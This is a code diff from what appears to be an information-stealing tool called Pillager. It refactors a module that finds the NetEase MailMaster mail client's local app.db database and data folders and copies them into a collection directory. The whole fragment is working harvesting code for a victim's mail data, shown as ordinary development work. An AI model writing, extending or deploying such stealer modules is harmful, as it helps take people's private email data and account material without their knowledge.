@@ -5,11 +5,9 @@ using System.IO;
 
 namespace Pillager.Mails
 {
-    internal class MailMaster
+    internal class MailMaster : ICommand
     {
-        public static string MailName = "MailMaster";
-
-        private static List<string> GetDataPath()
+        private List<string> GetDataPath()
         {
             List<string> strings = new List<string>();
             string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
@@ -31,32 +29,14 @@ namespace Pillager.Mails
             return strings;
         }
 
-        public static List<int> FindBytes(byte[] src, byte[] find)
-        {
-            List<int> offsets = new List<int>();
-            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return offsets;
-            for (int i = 0; i < src.Length - find.Length + 1; i++)
-            {
-                if (src[i] == find[0])
-                {
-                    for (int m = 1; m < find.Length; m++)
-                    {
-                        if (src[i + m] != find[m]) break;
-                        if (m == find.Length - 1) offsets.Add(i);
-                    }
-                }
-            }
-            return offsets;
-        }
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                 if (!Directory.Exists(sqlpath)) return;
                 List<string> datapath = GetDataPath();
-                string savepath = Path.Combine(path, MailName);
+                string savepath = Path.Combine(path, "MailMaster");
                 Directory.CreateDirectory(savepath);
                 foreach (var directory in datapath)
                 {
